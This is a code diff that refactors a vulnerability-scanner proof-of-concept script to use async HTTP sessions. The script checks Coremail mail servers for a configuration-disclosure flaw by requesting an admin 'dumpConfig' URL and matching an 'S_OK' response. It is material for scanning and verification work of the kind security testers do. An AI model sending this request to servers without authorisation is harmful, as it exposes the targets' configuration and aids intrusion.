@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import re
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -16,11 +16,14 @@ class POC(Script):
         self.level = 'high'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             url = self.base_url + 'mailsms/s?func=ADMIN:appState&dumpConfig=/'
-            r = self.curl('get', url)
-            if r != None and r.status_code != 404 and "<code>S_OK</code>" in r.text:
-                self.flag = 1
-                self.res.append({"info": url, "key": 'coremail configure'})
+            async with ClientSession() as session:
+                async with session.get(url=url) as res:
+                    if res!=None:
+                        text = await res.text()
+                        if res.status != 404 and "<code>S_OK</code>" in text:
+                            self.flag = 1
+                            self.res.append({"info": url, "key": 'coremail configure'})
